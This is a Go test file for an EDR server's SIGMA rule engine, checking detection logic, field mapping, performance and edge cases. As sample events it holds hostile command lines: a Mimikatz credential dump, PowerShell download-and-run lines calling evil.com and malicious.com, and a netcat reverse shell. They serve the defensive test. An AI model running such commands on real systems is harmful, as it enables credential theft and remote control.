package test

import (
	"encoding/json"
	"testing"
	"time"

	"edr-server/internal/sigma"

	"github.com/sirupsen/logrus"
)

// TestSigmaEngineLogic tests core SIGMA engine logic với real rules
func TestSigmaEngineLogic(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.DebugLevel)

	// Test cases based on real Sigma rules
	testCases := []struct {
		name        string
		rule        string
		testEvent   map[string]interface{}
		shouldMatch bool
		description string
	}{
		{
			name: "Mimikatz Detection - Should Match",
			rule: `
title: HackTool - Mimikatz Execution Test
id: a642964e-bead-4bed-8910-1bb4d63e3b4d
description: Detection well-known mimikatz command line arguments
logsource:
    category: process_creation
    product: windows
detection:
    selection_tools_name:
        CommandLine|contains:
            - 'DumpCreds'
            - 'mimikatz'
    selection_module_names:
        CommandLine|contains:
            - 'sekurlsa::'
            - 'lsadump::'
    condition: 1 of selection_*
level: high`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
				"Image":       "C:\\Tools\\mimikatz.exe",
				"ProcessId":   "1234",
			},
			shouldMatch: true,
			description: "Should match mimikatz execution with module name",
		},
		{
			name: "Mimikatz Detection - Should NOT Match",
			rule: `
title: HackTool - Mimikatz Execution Test
id: a642964e-bead-4bed-8910-1bb4d63e3b4d
description: Detection well-known mimikatz command line arguments
logsource:
    category: process_creation
    product: windows
detection:
    selection_tools_name:
        CommandLine|contains:
            - 'DumpCreds'
            - 'mimikatz'
    selection_module_names:
        CommandLine|contains:
            - 'sekurlsa::'
            - 'lsadump::'
    condition: 1 of selection_*
level: high`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"CommandLine": "notepad.exe test.txt",
				"Image":       "C:\\Windows\\System32\\notepad.exe",
				"ProcessId":   "5678",
			},
			shouldMatch: false,
			description: "Should NOT match legitimate process",
		},
		{
			name: "PowerShell DLL Execution - AND Logic Test",
			rule: `
title: Potential PowerShell Execution Via DLL
id: 6812a10b-60ea-420c-832f-dfcc33b646ba
description: Detects potential PowerShell execution from a DLL
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\rundll32.exe'
            - '\regsvr32.exe'
    selection_cli:
        CommandLine|contains:
            - 'IEX '
            - 'Invoke-Expression'
            - 'DownloadString'
    condition: all of selection_*
level: high`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Windows\\System32\\rundll32.exe",
				"CommandLine": "rundll32.exe powershell.dll,main IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')",
				"ProcessId":   "9999",
			},
			shouldMatch: true,
			description: "Should match rundll32 with PowerShell indicators (AND logic)",
		},
		{
			name: "PowerShell DLL Execution - Partial Match (should NOT match)",
			rule: `
title: Potential PowerShell Execution Via DLL
id: 6812a10b-60ea-420c-832f-dfcc33b646ba
description: Detects potential PowerShell execution from a DLL
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\rundll32.exe'
            - '\regsvr32.exe'
    selection_cli:
        CommandLine|contains:
            - 'IEX '
            - 'Invoke-Expression'
            - 'DownloadString'
    condition: all of selection_*
level: high`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Windows\\System32\\rundll32.exe",     // matches selection_img
				"CommandLine": "rundll32.exe user32.dll,LockWorkStation", // does NOT match selection_cli
				"ProcessId":   "1111",
			},
			shouldMatch: false,
			description: "Should NOT match with only partial conditions met (AND logic)",
		},
		{
			name: "Netcat Reverse Shell - Complex AND Logic",
			rule: `
title: Potential Netcat Reverse Shell Execution
id: 7f734ed0-4f47-46c0-837f-6ee62505abd9
description: Detects execution of netcat with reverse shell setup
logsource:
    category: process_creation
    product: linux
detection:
    selection_nc:
        Image|endswith:
            - '/nc'
            - '/ncat'
    selection_flags:
        CommandLine|contains:
            - ' -c '
            - ' -e '
    selection_shell:
        CommandLine|contains:
            - ' bash'
            - ' sh'
            - '/bin/bash'
            - '/bin/sh'
    condition: all of selection_*
level: high`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"Image":       "/usr/bin/nc",
				"CommandLine": "nc -e /bin/bash 192.168.1.100 4444",
				"ProcessId":   "2222",
			},
			shouldMatch: true,
			description: "Should match netcat reverse shell with all conditions",
		},
		{
			name: "DNS TXT Execution Strings",
			rule: `
title: DNS TXT Answer with Possible Execution Strings
id: 8ae51330-899c-4641-8125-e39f2e07da72
description: Detects strings used in command execution in DNS TXT Answer
logsource:
    category: dns
detection:
    selection:
        record_type: 'TXT'
        answer|contains:
            - 'IEX'
            - 'Invoke-Expression'
            - 'cmd.exe'
    condition: selection
level: high`,
			testEvent: map[string]interface{}{
				"record_type": "TXT",
				"answer":      "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
				"query":       "evil.malicious.com",
			},
			shouldMatch: true,
			description: "Should match DNS TXT with execution strings",
		},
		{
			name: "Field Mapping Test - ProcessImage to Image",
			rule: `
title: Process Image Field Mapping Test
id: test-field-mapping-123
description: Test field mapping functionality
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ProcessImage|endswith: '\powershell.exe'
        ProcessCommandLine|contains: 'Invoke-Expression'
    condition: selection
level: medium`,
			testEvent: map[string]interface{}{
				"EventID":     1,
				"Image":       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", // Should map from ProcessImage
				"CommandLine": "powershell.exe -Command Invoke-Expression",                      // Should map from ProcessCommandLine
				"ProcessId":   "3333",
			},
			shouldMatch: true,
			description: "Should match using field mapping (ProcessImage->Image, ProcessCommandLine->CommandLine)",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			// Initialize SIGMA Engine
			engine := sigma.NewSigmaEngine(nil, logger)

			// Add field mappings (similar to what we do in processor)
			engine.AddFieldMapping("ProcessImage", "Image")
			engine.AddFieldMapping("ProcessCommandLine", "CommandLine")
			engine.AddFieldMapping("ParentProcessImage", "ParentImage")

			// Compile rule
			err := engine.FromRules([]string{tc.rule})
			if err != nil {
				t.Fatalf("Failed to compile rule: %v", err)
			}

			// Evaluate event
			result, err := engine.Evaluate(tc.testEvent)
			if err != nil {
				t.Fatalf("Failed to evaluate event: %v", err)
			}

			// Check if result matches expectation
			matched := len(result.MatchedRules) > 0
			if matched != tc.shouldMatch {
				t.Errorf("Test %s failed: expected match=%v, got match=%v", tc.name, tc.shouldMatch, matched)
				t.Logf("Description: %s", tc.description)
				t.Logf("Event: %+v", tc.testEvent)
				t.Logf("Result: %+v", result)

				if len(result.MatchedRules) > 0 {
					for i, match := range result.MatchedRules {
						t.Logf("Match %d: RuleID=%s, Title=%s, Confidence=%f", i, match.RuleID, match.Title, match.Confidence)
						t.Logf("Matched Fields: %+v", match.MatchedFields)
					}
				}
			} else {
				t.Logf("✅ Test %s passed: %s", tc.name, tc.description)
				if matched {
					t.Logf("   Execution time: %v, Processed nodes: %d, Shared hits: %d",
						result.ExecutionTime, result.ProcessedNodes, result.SharedHits)
				}
			}
		})
	}
}

// TestSigmaEnginePerformance tests performance characteristics
func TestSigmaEnginePerformance(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.WarnLevel) // Reduce log noise for performance test

	// Load multiple real rules for performance testing
	rules := []string{
		// Mimikatz rule
		`title: Mimikatz Test
logsource: {category: process_creation, product: windows}
detection:
  selection:
    CommandLine|contains: ['mimikatz', 'sekurlsa::', 'lsadump::']
  condition: selection
level: high`,

		// PowerShell rule
		`title: PowerShell Test
logsource: {category: process_creation, product: windows}
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains: ['IEX', 'Invoke-Expression', 'DownloadString']
  condition: selection
level: medium`,

		// Netcat rule
		`title: Netcat Test
logsource: {category: process_creation, product: linux}
detection:
  selection:
    Image|endswith: ['/nc', '/ncat']
    CommandLine|contains: [' -e ', ' -c ']
  condition: selection
level: high`,
	}

	engine := sigma.NewSigmaEngine(nil, logger)
	err := engine.FromRules(rules)
	if err != nil {
		t.Fatalf("Failed to compile rules: %v", err)
	}

	// Test events
	events := []map[string]interface{}{
		{
			"EventID":     1,
			"Image":       "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
			"CommandLine": "powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
			"ProcessId":   "1234",
		},
		{
			"EventID":     1,
			"Image":       "C:\\Tools\\mimikatz.exe",
			"CommandLine": "mimikatz.exe sekurlsa::logonpasswords",
			"ProcessId":   "5678",
		},
		{
			"EventID":     1,
			"Image":       "/usr/bin/nc",
			"CommandLine": "nc -e /bin/bash 192.168.1.100 4444",
			"ProcessId":   "9999",
		},
		{
			"EventID":     1,
			"Image":       "C:\\Windows\\System32\\notepad.exe",
			"CommandLine": "notepad.exe test.txt",
			"ProcessId":   "1111",
		},
	}

	// Performance test: single event evaluation
	start := time.Now()
	for i := 0; i < 1000; i++ {
		for _, event := range events {
			_, err := engine.Evaluate(event)
			if err != nil {
				t.Fatalf("Evaluation failed: %v", err)
			}
		}
	}
	singleDuration := time.Since(start)

	// Performance test: batch evaluation
	start = time.Now()
	for i := 0; i < 250; i++ { // 250 * 4 = 1000 events
		_, err := engine.EvaluateBatch(events)
		if err != nil {
			t.Fatalf("Batch evaluation failed: %v", err)
		}
	}
	batchDuration := time.Since(start)

	t.Logf("Performance Results:")
	t.Logf("Single evaluation: %v for 4000 events (%.2f μs/event)", singleDuration, float64(singleDuration.Nanoseconds())/4000/1000)
	t.Logf("Batch evaluation: %v for 1000 batches of 4 events (%.2f μs/event)", batchDuration, float64(batchDuration.Nanoseconds())/4000/1000)

	// Batch should be faster due to optimizations
	if batchDuration > singleDuration {
		t.Logf("⚠️  Batch evaluation is slower than single evaluation - check optimization")
	} else {
		t.Logf("✅ Batch evaluation is faster - optimizations working")
	}

	// Get engine metrics
	metrics := engine.GetMetrics()
	metricsJSON, _ := json.MarshalIndent(metrics, "", "  ")
	t.Logf("Engine Metrics:\n%s", string(metricsJSON))
}

// TestSigmaEngineEdgeCases tests edge cases and error conditions
func TestSigmaEngineEdgeCases(t *testing.T) {
	logger := logrus.New()
	logger.SetLevel(logrus.WarnLevel)

	testCases := []struct {
		name        string
		rule        string
		event       map[string]interface{}
		expectError bool
		description string
	}{
		{
			name: "Invalid YAML",
			rule: `invalid yaml: [missing closing bracket`,
			event: map[string]interface{}{
				"test": "value",
			},
			expectError: true,
			description: "Should handle invalid YAML gracefully",
		},
		{
			name: "Missing condition",
			rule: `
title: Test Rule
detection:
  selection:
    field: value`,
			event: map[string]interface{}{
				"field": "value",
			},
			expectError: true,
			description: "Should error on missing condition",
		},
		{
			name: "Empty event",
			rule: `
title: Test Rule
detection:
  selection:
    field: value
  condition: selection`,
			event:       map[string]interface{}{},
			expectError: false,
			description: "Should handle empty events without error",
		},
		{
			name: "Null values in event",
			rule: `
title: Test Rule
detection:
  selection:
    field: value
  condition: selection`,
			event: map[string]interface{}{
				"field": nil,
				"other": "value",
			},
			expectError: false,
			description: "Should handle null values gracefully",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			engine := sigma.NewSigmaEngine(nil, logger)

			err := engine.FromRules([]string{tc.rule})

			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error for %s but got none", tc.name)
				} else {
					t.Logf("✅ Expected error caught: %v", err)
				}
				return
			}

			if err != nil {
				t.Fatalf("Unexpected error compiling rule: %v", err)
			}

			result, err := engine.Evaluate(tc.event)
			if err != nil {
				t.Fatalf("Unexpected evaluation error: %v", err)
			}

			t.Logf("✅ %s: %s (matched: %v)", tc.name, tc.description, len(result.MatchedRules) > 0)
		})
	}
}
